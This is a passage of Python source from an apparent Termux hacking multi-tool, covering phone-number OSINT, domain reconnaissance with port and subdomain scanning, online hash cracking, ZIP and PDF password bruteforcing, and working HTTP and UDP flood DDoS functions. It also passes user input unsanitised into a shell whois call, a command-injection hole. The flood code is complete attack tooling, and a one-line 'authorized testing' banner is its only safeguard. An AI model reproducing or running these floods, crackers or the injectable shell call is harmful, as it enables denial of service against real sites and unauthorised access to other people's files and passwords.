# --- PHONE ANALYSIS (KEPT INTACT) ---
def analyze_phone(phone):
    if not phone.startswith('+'):
        print(f"{R}[!] Use international format: +628123456789")
        input(f"\n{C}Press ENTER...")
        return
    clean_phone = ''.join(filter(str.isdigit, phone[1:]))
    full_number = '+' + clean_phone
    if len(clean_phone) < 7 or len(clean_phone) > 15:
        print(f"{R}[!] Invalid number: must be 7–15 digits after '+'")
        input(f"\n{C}Press ENTER...")
        return
    country_data = {
        '1': {'name': 'USA / Canada', 'timezone': 'UTC-5 to UTC-8', 'format': 'XXX-XXX-XXXX'},
        '44': {'name': 'United Kingdom', 'timezone': 'UTC+0 / UTC+1 (BST)', 'format': 'XXXX XXX XXXX'},
        '91': {'name': 'India', 'timezone': 'UTC+5:30', 'format': 'XXXXX XXXXX'},
        '49': {'name': 'Germany', 'timezone': 'UTC+1 / UTC+2 (CEST)', 'format': 'XXXX XXXXXXX'},
        '33': {'name': 'France', 'timezone': 'UTC+1 / UTC+2 (CEST)', 'format': 'XX XX XX XX XX'},
        '81': {'name': 'Japan', 'timezone': 'UTC+9', 'format': 'XX-XXXX-XXXX'},
        '82': {'name': 'South Korea', 'timezone': 'UTC+9', 'format': 'XX-XXXX-XXXX'},
        '7': {'name': 'Russia / Kazakhstan', 'timezone': 'UTC+3 to UTC+12', 'format': 'XXX XXX-XX-XX'},
        '62': {'name': 'Indonesia', 'timezone': 'UTC+7 to UTC+9 (WIB/WITA/WIT)', 'format': 'XXX-XXXX-XXXX'},
        '60': {'name': 'Malaysia', 'timezone': 'UTC+8', 'format': 'XX-XXXX XXXX'},
        '66': {'name': 'Thailand', 'timezone': 'UTC+7', 'format': 'XX XXXX XXXX'},
        '63': {'name': 'Philippines', 'timezone': 'UTC+8', 'format': 'XX XXXX XXXX'},
        '84': {'name': 'Vietnam', 'timezone': 'UTC+7', 'format': 'XX XXXX XXXX'},
        '855': {'name': 'Cambodia', 'timezone': 'UTC+7', 'format': 'XX XXX XXXX'},
        '856': {'name': 'Laos', 'timezone': 'UTC+7', 'format': 'XX XXX XXXX'},
        '95': {'name': 'Myanmar', 'timezone': 'UTC+6:30', 'format': 'XX XXX XXXX'},
    }
    country_code = None
    country_info = {'name': 'Unknown', 'timezone': 'Unknown', 'format': 'Unknown'}
    national_number = clean_phone
    if clean_phone.startswith('1') and 10 <= len(clean_phone) <= 11:
        country_code = '1'
        national_number = clean_phone[1:]
    elif clean_phone.startswith('44') and len(clean_phone) >= 10:
        country_code = '44'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('91') and len(clean_phone) == 10:
        country_code = '91'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('49') and len(clean_phone) >= 10:
        country_code = '49'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('33') and len(clean_phone) == 9:
        country_code = '33'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('81') and len(clean_phone) >= 9:
        country_code = '81'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('82') and len(clean_phone) >= 9:
        country_code = '82'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('7') and len(clean_phone) in (10, 11):
        country_code = '7'
        national_number = clean_phone[1:]
    elif clean_phone.startswith('62') and len(clean_phone) >= 10:
        country_code = '62'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('60') and len(clean_phone) == 9:
        country_code = '60'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('66') and len(clean_phone) == 9:
        country_code = '66'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('63') and len(clean_phone) == 10:
        country_code = '63'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('84') and len(clean_phone) == 9:
        country_code = '84'
        national_number = clean_phone[2:]
    elif clean_phone.startswith('855') and len(clean_phone) == 8:
        country_code = '855'
        national_number = clean_phone[3:]
    elif clean_phone.startswith('856') and len(clean_phone) == 8:
        country_code = '856'
        national_number = clean_phone[3:]
    elif clean_phone.startswith('95') and len(clean_phone) == 8:
        country_code = '95'
        national_number = clean_phone[2:]
    else:
        if clean_phone.startswith('1'):
            country_code = '1'
        elif clean_phone.startswith('4'):
            country_info = {'name': 'Western Europe', 'timezone': 'UTC+0 to UTC+2', 'format': 'Varies'}
        elif clean_phone.startswith('5'):
            country_info = {'name': 'Latin America', 'timezone': 'UTC-3 to UTC-6', 'format': 'Varies'}
        elif clean_phone.startswith('2'):
            country_info = {'name': 'Africa', 'timezone': 'UTC+0 to UTC+4', 'format': 'Varies'}
        elif clean_phone.startswith('9'):
            country_info = {'name': 'Middle East / South Asia', 'timezone': 'UTC+3 to UTC+6', 'format': 'Varies'}
    if country_code and country_code in country_data:
        country_info = country_data[country_code]
    national_fmt = national_number
    if country_code == '62':
        if not national_number.startswith('0'):
            national_fmt = '0' + national_number
        if len(national_fmt) >= 10:
            if national_fmt.startswith('08'):
                national_fmt = f"{national_fmt[:4]}-{national_fmt[4:8]}-{national_fmt[8:]}"
            else:
                national_fmt = f"{national_fmt[:3]}-{national_fmt[3:6]}-{national_fmt[6:]}"
    carrier = "Unknown"
    line_type = "Unknown"
    is_voip = False
    is_business = False
    area = "National"
    if country_code == '62' and national_number:
        prefix3 = national_number[:3]
        if prefix3 in ['811', '812', '813', '821', '822', '823']:
            carrier = "Telkomsel"
            line_type = "Mobile"
            if prefix3 == '811': area = "National (Simpati)"
            elif prefix3 == '821': area = "Jakarta Metropolitan"
            elif prefix3 == '822': area = "West Java"
            elif prefix3 == '823': area = "Central Java / Yogyakarta"
            elif prefix3 == '812': area = "National (Kartu As)"
            elif prefix3 == '813': area = "National (Loop)"
        elif prefix3 in ['851', '852', '853', '855', '856', '857', '858', '859', '891', '892', '893', '894']:
            carrier = "Indosat Ooredoo Hutchison"
            line_type = "Mobile"
            if prefix3 in ['852', '853', '858']: area = "IM3 (National)"
            elif prefix3.startswith('89'): area = "Tri (now part of Indosat)"
        elif prefix3 in ['817', '818', '819', '831', '832', '833', '838', '839', '877', '878']:
            carrier = "XL Axiata / Axis"
            line_type = "Mobile"
            if prefix3.startswith('83'): area = "Axis"
            else: area = "XL"
        elif prefix3 in ['895', '896', '897', '898', '899']:
            carrier = "Smartfren"
            line_type = "Mobile (4G Only)"
            area = "National"
            is_voip = True
        elif national_number.startswith('80'):
            carrier = "MVNO / Virtual Operator"
            line_type = "Mobile"
            area = "Varies (By.U, etc)"
        elif national_number.startswith('21') and len(national_number) <= 8:
            carrier = "Telkom (Fixed Line)"
            line_type = "Landline"
            area = "Jakarta"
            is_business = True
        else:
            carrier = "Unknown operator"
    elif country_code == '60' and national_number:
        if national_number.startswith('1'): carrier = "Celcom / Maxis / Digi (MY)"
    elif country_code == '66' and national_number:
        if national_number.startswith(('8','9')): carrier = "AIS / TrueMove / DTAC (TH)"
    elif country_code == '63' and national_number:
        if national_number.startswith('9'): carrier = "Globe / Smart (PH)"
    is_voip = False
    is_valid = 7 <= len(clean_phone) <= 15
    is_mobile = "Mobile" in line_type or (national_number and national_number[0] in '89')
    likely_active = is_valid and is_mobile
    e164_format = full_number
    scam_indicators = []
    if len(national_number) > 12:
        scam_indicators.append("Too long for a mobile number")
    if national_number.startswith(('888', '8999', '9999', '000')):
        scam_indicators.append("Premium or paid service number")
    if is_voip and not is_business:
        scam_indicators.append("Uses VoIP (possibly anonymous)")
    print(f"\n{G}{'='*55}")
    print(f"{G}📱 PHONE NUMBER ANALYSIS (OSINT - LOCAL)")
    print(f"{G}{'='*55}")
    print(f"{G}➤ Number (E.164)       : {W}{e164_format}")
    print(f"{G}➤ Country              : {W}{country_info['name']} (Code: +{country_code or '??'})")
    print(f"{G}➤ National Format      : {W}{national_fmt}")
    print(f"{G}➤ Timezone             : {W}{country_info['timezone']}")
    print(f"{G}➤ Region (Estimated)   : {W}{area}")
    print(f"{G}➤ Carrier              : {W}{carrier}")
    print(f"{G}➤ Network Type         : {W}{line_type}")
    print(f"{G}➤ User Type            : {W}{'Business' if is_business else 'Personal (Likely)'}")
    print(f"{G}➤ Technology           : {W}{'VoIP / 4G' if is_voip else 'Regular Mobile'}")
    print(f"{G}➤ Valid Status         : {W}{'✅ Yes' if is_valid else '❌ No'}")
    print(f"{G}➤ Likely Active        : {W}{'✅ High' if likely_active else '❓ Low'}")
    if scam_indicators:
        print(f"\n{R}⚠️  SCAM INDICATORS:")
        for warn in scam_indicators[:3]:
            print(f"    • {warn}")
    print(f"\n{Y}[i] Advanced verification (open manually in browser):")
    print(f"   🔍 {C}https://numverify.com")
    print(f"   📱 {C}https://www.truecaller.com/search/{e164_format}")
    print(f"   🌐 {C}https://www.opencnam.com/{e164_format}")
    print(f"   📍 {C}https://www.imei.info/phonenumber/{e164_format}")
    print(f"\n{G}{'='*55}")
    input(f"\n{C}Press ENTER to return...")
# --- DOMAIN INTELLIGENCE (KEPT INTACT) ---
def domain_intel(domain):
    if domain.startswith(('http://', 'https://')):
        domain = domain.split('://')[1].split('/')[0]
    print(f"\n{G}➤ Scanning domain: {W}{domain}")
    time.sleep(1)
    web_accessible = False
    r = None
    try:
        r = requests.get(f"https://{domain}", timeout=8)
        web_accessible = True
        print(f"{G}[+] HTTPS: {C}https://{domain} {W}({r.status_code})")
    except:
        try:
            r = requests.get(f"http://{domain}", timeout=8)
            web_accessible = True
            print(f"{G}[+] HTTP: {C}http://{domain} {W}({r.status_code})")
        except:
            print(f"{R}[-] Cannot access web (HTTP/HTTPS failed).")
    if web_accessible:
        print(f"\n{Y}[*] Checking robots.txt...")
        try:
            rb = requests.get(f"http://{domain}/robots.txt", timeout=5)
            if rb.status_code == 200:
                print(f"{G}[+] robots.txt found:")
                lines = [line.strip() for line in rb.text.split('\n') if line.strip()][:10]
                for line in lines:
                    print(f"    {W}{line}")
            else:
                print(f"{Y}[-] robots.txt not found (404).")
        except:
            print(f"{R}[-] Failed to fetch robots.txt.")
        print(f"\n{Y}[*] Checking for .git exposure...")
        try:
            git_resp = requests.get(f"http://{domain}/.git/HEAD", timeout=5)
            if git_resp.status_code == 200 and "ref:" in git_resp.text:
                print(f"{R}[!] WARNING: Git repository exposed!")
                print(f"{C}    http://{domain}/.git/HEAD")
            else:
                print(f"{G}[✓] No .git exposure.")
        except:
            print(f"{Y}[-] Cannot verify .git.")
        print(f"\n{Y}[*] Analyzing HTTP headers...")
        print(f"{G}[+] Response headers:")
        for key, value in r.headers.items():
            print(f"    {W}{key}: {C}{value}")
        print(f"\n{Y}[*] Scanning common subdomains...")
        subdomains = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'imap', 'admin', 'test', 'dev', 'api', 'blog', 'shop', 'support']
        found_subs = []
        for sub in subdomains:
            try:
                target = f"{sub}.{domain}"
                requests.get(f"http://{target}", timeout=3)
                print(f"{G}[+] Found: {C}{target}")
                found_subs.append(target)
            except:
                pass
        if not found_subs:
            print(f"{Y}[-] No common subdomains found.")
        print(f"\n{Y}[*] Scanning common ports...")
        common_ports = [21, 22, 25, 53, 80, 443, 3306, 8080]
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((domain, port))
                if result == 0:
                    service = {21:'FTP', 22:'SSH', 25:'SMTP', 53:'DNS', 80:'HTTP', 443:'HTTPS', 3306:'MySQL', 8080:'HTTP-ALT'}.get(port, 'Unknown')
                    print(f"{G}[+] Open port: {W}{port} ({service})")
                    open_ports.append(port)
                sock.close()
            except:
                pass
        if not open_ports:
            print(f"{Y}[-] No common ports open.")
        print(f"\n{Y}[*] Fetching WHOIS info (via system command)...")
        try:
            result = os.popen(f"whois {domain} 2>/dev/null").read()
            if result.strip():
                lines = [line for line in result.split('\n') if line.strip()][:20]
                if lines:
                    print(f"{G}[+] WHOIS Info (via whois command):")
                    for line in lines:
                        print(f"    {W}{line[:100]}")
                else:
                    print(f"{Y}[-] No WHOIS data returned.")
            else:
                print(f"{Y}[-] WHOIS returned no response.")
        except Exception as e:
            print(f"{R}[-] Failed to run WHOIS: {e}")
        print(f"\n{Y}[*] Detecting web technologies...")
        html = r.text.lower()
        headers = {k.lower(): v for k, v in r.headers.items()}
        techs = set()
        server = headers.get('server', '').lower()
        powered = headers.get('x-powered-by', '').lower()
        if 'apache' in server: techs.add("Apache")
        if 'nginx' in server: techs.add("Nginx")
        if 'cloudflare' in server: techs.add("Cloudflare")
        if 'php' in powered: techs.add("PHP")
        if 'asp.net' in powered: techs.add("ASP.NET")
        if 'wordpress' in html or '/wp-content/' in html or '/wp-includes/' in html:
            techs.add("WordPress")
        if 'joomla' in html or '/media/jui/' in html:
            techs.add("Joomla")
        if 'drupal' in html or 'sites/all/modules' in html:
            techs.add("Drupal")
        if 'prestashop' in html:
            techs.add("PrestaShop")
        if 'magento' in html or 'mage-' in html:
            techs.add("Magento")
        if 'shopify' in html or 'cdn.shopify.com' in html:
            techs.add("Shopify")
        if 'react' in html and 'reactroot' in html:
            techs.add("React")
        if 'vue' in html and ('_v' in html or 'vuejs' in html):
            techs.add("Vue.js")
        if 'nextjs' in html or '_next/static' in html:
            techs.add("Next.js")
        if 'laravel' in html or 'X-Laravel' in r.headers:
            techs.add("Laravel")
        try:
            soup = BeautifulSoup(r.text, 'html.parser')
            gen = soup.find('meta', {'name': 'generator'})
            if gen and gen.get('content'):
                techs.add(f"Meta: {gen['content'][:30]}")
        except:
            pass
        if techs:
            print(f"{G}[+] Detected technologies: {W}{', '.join(sorted(techs))}")
        else:
            print(f"{Y}[-] Cannot detect specific technologies.")
        print(f"\n{Y}[*] Checking SSL certificate (if any)...")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    subject = dict(x[0] for x in cert['subject'])
                    issuer = dict(x[0] for x in cert['issuer'])
                    expiry = cert['notAfter']
                    print(f"{G}[+] Valid SSL cert until: {W}{expiry}")
                    print(f"    Issuer: {W}{issuer.get('commonName', 'N/A')}")
                    print(f"    Subject: {W}{subject.get('commonName', 'N/A')}")
        except:
            print(f"{Y}[-] No SSL or cannot verify.")
        print(f"\n{Y}[*] Detecting Web Application Firewall (WAF)...")
        waf_headers = [
            'x-sucuri-id', 'x-amz-cf-id', 'x-cdn', 'server', 'x-powered-by',
            'x-firewall', 'x-waf', 'cf-ray', 'x-protected-by'
        ]
        waf_detected = []
        for hdr in waf_headers:
            if hdr in r.headers:
                val = r.headers[hdr].lower()
                if 'cloudflare' in val:
                    waf_detected.append("Cloudflare")
                elif 'sucuri' in val:
                    waf_detected.append("Sucuri")
                elif 'imperva' in val or 'incapsula' in val:
                    waf_detected.append("Imperva")
                elif 'aws' in val or 'amazon' in val:
                    waf_detected.append("AWS WAF")
        if waf_detected:
            print(f"{R}[!] WAF detected: {W}{', '.join(set(waf_detected))}")
        else:
            print(f"{G}[✓] No WAF detected.")
    input(f"\n{C}Scan complete. Press ENTER to return...")
# ======================
# 🌐 WEB SCRAPING
# ======================
def scrape_page(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        title = soup.title.string if soup.title else "No title"
        print(f"\n{G}Title: {W}{title}")
        print(f"{G}Text (500 char):{W}\n{soup.get_text()[:500]}...")
        input(f"\n{C}Press ENTER...")
    except Exception as e:
        print(f"{R}[!] Error: {e}")
        input(f"\n{C}Press ENTER...")
def clone_page(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        r = requests.get(url, timeout=10)
        print(f"\n{G}[+] Full HTML content:{W}")
        print(r.text)
        print(f"\n{Y}[i] Not saved – only displayed in terminal")
        input(f"\n{C}Press ENTER...")
    except Exception as e:
        print(f"{R}[!] Error: {e}")
        input(f"\n{C}Press ENTER...")
def web_scraping():
    while True:
        banner()
        print(f"\n{G}[01]{W} Fetch Title & Text")
        print(f"{G}[02]{W} Show Full HTML")
        print(f"{G}[95]{W} Back")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select: {W}")
        if choice in ['1', '2']:
            url = input(f"{W}URL: {W}").strip()
            if url:
                if choice == '1': scrape_page(url)
                else: clone_page(url)
        elif choice == '95':
            break
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.")
            time.sleep(1)
# ======================
# 🔐 HASH CRACKING + ANALYSIS
# ======================
def analyze_hash_type(hash_str):
    h = hash_str.lower()
    if not all(c in '0123456789abcdef' for c in h):
        return "Invalid (contains non-hex characters)"
    length = len(h)
    if length == 32:
        return "Possible: MD5, NTLM, MD4, LM"
    elif length == 40:
        return "Possible: SHA1, RIPEMD160"
    elif length == 64:
        return "Possible: SHA256, BLAKE2s"
    elif length == 128:
        return "Possible: SHA512"
    elif length == 16:
        return "Possible: MySQL < 5.0, DES"
    elif length == 56 and ':' in hash_str:
        return "Possible: NetNTLMv2"
    elif length == 48 and ':' in hash_str:
        return "Possible: NetNTLMv1"
    elif h.startswith('$'):
        if h.startswith('$1$'):
            return "MD5 Crypt (Unix)"
        elif h.startswith('$2a$') or h.startswith('$2b$') or h.startswith('$2y$'):
            return "bcrypt"
        elif h.startswith('$5$'):
            return "SHA256 Crypt (Unix)"
        elif h.startswith('$6$'):
            return "SHA512 Crypt (Unix)"
        elif h.startswith('$P$') or h.startswith('$H$'):
            return "phpBB / WordPress (Portable Hash)"
        else:
            return "Salted hash (Unix-style)"
    else:
        return f"Unrecognized (length: {length})"
def crack_hash_hashescom(pass_hash):
    try:
        if len(pass_hash) not in [16, 32, 40, 48, 56, 64, 128]:
            print(f"{Y}[i] Warning: Uncommon hash length.{D}")
        url = "https://hashes.com/en/decrypt/hash"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Blood-OSINT/2.0; Termux)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = f"hashes={pass_hash}&decrypt=Decrypt+Hashes"
        print(f"\n{Y}[*] Sending to hashes.com...{D}")
        r = requests.post(url, headers=headers, data=data, timeout=12)
        if "No hashes found for decryption" in r.text:
            print(f"{R}[!] ❌ Not found in public database.{D}")
            return False
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        table = soup.find('table', {'class': 'table'})
        if not table:
            print(f"{Y}[?] Response lacks result table.{D}")
            return False
        rows = table.find_all('tr')[1:]
        for row in rows:
            cols = row.find_all('td')
            if len(cols) >= 4:
                detected_hash = cols[1].get_text(strip=True).lower()
                plain_text = cols[3].get_text(strip=True)
                if detected_hash == pass_hash.lower():
                    print(f"\n{G}[+] ✅ FOUND!{D}")
                    print(f"{G}Plaintext: {W}{plain_text}")
                    return True
        print(f"{R}[!] No exact match.{D}")
        return False
    except requests.exceptions.Timeout:
        print(f"{R}[!] Timeout: hashes.com is slow.{D}")
        return False
    except Exception as e:
        print(f"{R}[!] Error during cracking: {str(e)}{D}")
        return False
def hash_cracking():
    while True:
        banner()
        print(f"\n{G}[01]{W} Crack & Analyze Hash (Online via Hashes.com)")
        print(f"{G}[95]{W} Back")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select: {W}")
        if choice == '1':
            raw_hash = input(f"{W}Enter hash: {W}").strip()
            if not raw_hash:
                print(f"{R}[!] Hash cannot be empty.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            pass_hash = raw_hash.replace(' ', '').replace('\n', '').replace('\r', '')
            if not pass_hash:
                print(f"{R}[!] Invalid input.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            print(f"\n{C}{'='*50}")
            print(f"{C}🔍 HASH ANALYSIS")
            print(f"{C}{'='*50}")
            print(f"{G}Original Hash  : {W}{raw_hash}")
            print(f"{G}Length         : {W}{len(pass_hash)} characters")
            print(f"{G}Type           : {W}{analyze_hash_type(pass_hash)}")
            if not all(c in '0123456789abcdef' for c in pass_hash.lower()):
                print(f"{Y}[!] Warning: Hash contains suspicious characters.{D}")
            if len(pass_hash) in [16, 32, 40, 64, 128] and \
               all(c in '0123456789abcdef' for c in pass_hash.lower()):
                print(f"\n{Y}[~] Starting online cracking...{D}")
                success = crack_hash_hashescom(pass_hash)
                if not success:
                    print(f"\n{Y}[i] Tip: Hash can only be cracked if it's been breached and exists in public databases.")
                    print(f"    Example hashes often found: MD5('123456'), SHA1('password')\n")
            else:
                print(f"\n{Y}[i] This hash is not supported for automatic cracking (special format or uncommon length).{D}")
            input(f"\n{C}Press ENTER to return...")
        elif choice == '95':
            break
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.{D}")
            time.sleep(1)
# ======================
# 🔓 DOCUMENT BRUTEFORCE
# ======================
def brute_zip(filepath, wordlist_path):
    import zipfile
    if not os.path.isfile(wordlist_path):
        print(f"{R}[!] Wordlist not found: {wordlist_path}{D}")
        return False
    print(f"\n{Y}[*] Starting ZIP bruteforce with wordlist: {wordlist_path}{D}")
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            total_lines = sum(1 for line in f if line.strip())
        with open(wordlist_path, 'r', errors='ignore') as f:
            tried = 0
            for line in f:
                password = line.strip()
                if not password:
                    continue
                tried += 1
                try:
                    with zipfile.ZipFile(filepath) as zf:
                        zf.extractall(pwd=password.encode())
                        print(f"\n{G}[+] ✅ SUCCESS!{D}")
                        print(f"{G}Password: {W}{password}{D}")
                        print(f"{G}Files extracted to current directory.{D}")
                        return True
                except (RuntimeError, zipfile.BadZipFile, zipfile.LargeZipFile):
                    if tried % 20 == 0:
                        print(f"{C}[{tried}/{total_lines}] Trying: {password}{D}", end='\r')
                    continue
                except Exception:
                    continue
        print(f"\n{R}[!] Failed: No matching password found.{D}")
        return False
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user.{D}")
        return False
    except Exception as e:
        print(f"\n{R}[!] Error: {e}{D}")
        return False
def brute_pdf(filepath, wordlist_path):
    try:
        from PyPDF2 import PdfReader
    except ImportError:
        print(f"{R}[!] PyPDF2 not installed.{D}")
        print(f"{Y}Run in Termux: {W}pip install PyPDF2{D}")
        return False
    if not os.path.isfile(wordlist_path):
        print(f"{R}[!] Wordlist not found: {wordlist_path}{D}")
        return False
    print(f"\n{Y}[*] Starting PDF bruteforce with wordlist: {wordlist_path}{D}")
    try:
        reader = PdfReader(filepath)
        if not reader.is_encrypted:
            print(f"{G}[i] PDF is not encrypted.{D}")
            return True
        with open(wordlist_path, 'r', errors='ignore') as f:
            total_lines = sum(1 for line in f if line.strip())
        with open(wordlist_path, 'r', errors='ignore') as f:
            tried = 0
            for line in f:
                password = line.strip()
                if not password:
                    continue
                tried += 1
                try:
                    if reader.decrypt(password):
                        print(f"\n{G}[+] ✅ SUCCESS!{D}")
                        print(f"{G}Password: {W}{password}{D}")
                        return True
                except Exception:
                    pass
                if tried % 20 == 0:
                    print(f"{C}[{tried}/{total_lines}] Trying: {password}{D}", end='\r')
        print(f"\n{R}[!] Failed: No matching password found.{D}")
        return False
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user.{D}")
        return False
    except Exception as e:
        print(f"\n{R}[!] Error: {e}{D}")
        return False
def document_bruteforce():
    while True:
        banner()
        print(f"\n{G}[01]{W} Bruteforce ZIP")
        print(f"{G}[02]{W} Bruteforce PDF")
        print(f"{G}[95]{W} Back")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select: {W}")
        if choice in ['1', '2']:
            filepath = input(f"{W}Target file path (e.g., ~/file.zip): {W}").strip()
            if not filepath:
                print(f"{R}[!] File path cannot be empty.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            if filepath.startswith('~'):
                filepath = os.path.expanduser(filepath)
            if not os.path.isfile(filepath):
                print(f"{R}[!] Target file not found: {filepath}{D}")
                input(f"\n{C}Press ENTER...")
                continue
            wordlist = input(f"{W}Your wordlist path: {W}").strip()
            if not wordlist:
                print(f"{R}[!] Wordlist is required.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            if wordlist.startswith('~'):
                wordlist = os.path.expanduser(wordlist)
            if choice == '1':
                if not filepath.lower().endswith('.zip'):
                    print(f"{Y}[i] Warning: Extension not .zip, still trying.{D}")
                brute_zip(filepath, wordlist)
            elif choice == '2':
                if not filepath.lower().endswith('.pdf'):
                    print(f"{Y}[i] Warning: Extension not .pdf, still trying.{D}")
                brute_pdf(filepath, wordlist)
            input(f"\n{C}Press ENTER to return...")
        elif choice == '95':
            break
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.{D}")
            time.sleep(1)
# ======================
# 💥 DDoS ATTACK (LAYER 7 & 4)
# ======================
def http_flood_optimized(target_url, threads, duration):
    import threading
    import time
    import urllib3
    import random
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    common_paths = ["/", "/index.php", "/login", "/contact", "/about", "/admin", "/wp-login.php", "/api/status", "/health", "/.env", "/test"]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ]
    print(f"\n{Y}[*] Starting Layer 7 DDoS (Optimized) to: {C}{target_url}{D}")
    print(f"{Y}[*] Threads: {C}{threads}{Y} | Duration: {C}{duration} seconds{D}")
    print(f"{G}[+] Features: Random Path + Real User-Agent + Keep-Alive{D}")
    print(f"{Y}[*] Press Ctrl+C anytime to stop.{D}\n")
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    stop_flag = threading.Event()
    request_count = [0]
    error_count = [0]
    def attack():
        while not stop_flag.is_set():
            try:
                path = random.choice(common_paths)
                full_url = target_url.rstrip('/') + path
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                r = requests.get(full_url, headers=headers, timeout=5, verify=False)
                request_count[0] += 1
                if r.status_code >= 400:
                    error_count[0] += 1
            except:
                error_count[0] += 1
                pass
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
    try:
        start_time = time.time()
        while time.time() - start_time < duration:
            time.sleep(2)
            total = request_count[0]
            errors = error_count[0]
            success = total - errors
            print(f"\r{G}[+] Success: {W}{success}{G} | Errors: {R}{errors}{D}", end='', flush=True)
    except KeyboardInterrupt:
        pass
    finally:
        stop_flag.set()
        print(f"\n{R}[!] Attack stopped.{D}")
        input(f"\n{C}Press ENTER to return...")
def udp_flood(target_ip, target_port, duration):
    import threading
    import time
    import socket
    import random
    print(f"\n{Y}[*] Starting Layer 4 DDoS (UDP Flood) to: {C}{target_ip}:{target_port}{D}")
    print(f"{Y}[*] Duration: {C}{duration} seconds{D}")
    print(f"{G}[+] Using regular socket (non-root) or raw socket (root).{D}")
    print(f"{Y}[*] Press Ctrl+C anytime to stop.{D}\n")
    stop_flag = threading.Event()
    packet_count = [0]
    def send_udp():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            while not stop_flag.is_set():
                sock.sendto(payload, (target_ip, target_port))
                packet_count[0] += 1
        except Exception:
            pass
    for _ in range(20):
        t = threading.Thread(target=send_udp)
        t.daemon = True
        t.start()
    try:
        start_time = time.time()
        while time.time() - start_time < duration:
            time.sleep(1)
            print(f"\r{G}[+] Packets sent: {W}{packet_count[0]}{D}", end='', flush=True)
    except KeyboardInterrupt:
        pass
    finally:
        stop_flag.set()
        print(f"\n{R}[!] Attack stopped.{D}")
        input(f"\n{C}Press ENTER to return...")
def ddos_attack():
    while True:
        banner()
        print(f"\n{Y}⚠️  WARNING: Use only for authorized testing.{D}")
        print(f"\n{G}[01]{W} Layer 7 – HTTP Flood (Domain/URL)")
        print(f"{G}[02]{W} Layer 4 – UDP Flood (IP + Port) {R}{'[ROOT ONLY]' if not is_root() else '[ACTIVE]'}{D}")
        print(f"{G}[95]{W} Back")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select: {W}")
        if choice == '1':
            domain = input(f"{W}Target domain (e.g., example.com): {W}").strip()
            if not domain:
                print(f"{R}[!] Domain cannot be empty.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            try:
                threads = int(input(f"{W}Number of threads (recommended: 50–200): {W}") or "100")
                duration = int(input(f"{W}Attack duration (seconds): {W}") or "30")
                if threads < 1 or threads > 500:
                    threads = 100
                if duration < 5:
                    duration = 5
            except ValueError:
                threads, duration = 100, 30
            try:
                test_url = f"http://{domain}"
                print(f"\n{Y}[*] Testing connection to target...{D}")
                r = requests.get(test_url, timeout=5)
                print(f"{G}[✓] Target responded ({r.status_code}).{D}")
            except:
                print(f"{Y}[i] Target may be down or blocking, continue anyway?{D}")
                if input(f"{C}Continue? (y/n): {W}").lower() != 'y':
                    continue
            http_flood_optimized(domain, threads, duration)
        elif choice == '2':
            if not is_root():
                print(f"\n{R}[!] ⛔ LAYER 4 REQUIRES ROOT!{D}")
                print(f"{Y}Reason: Layer 4 needs low-level network access.{D}")
                print(f"{C}Solution: Root your device or use a Linux VPS.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            print(f"\n{G}[✓] Root detected. Layer 4 enabled.{D}")
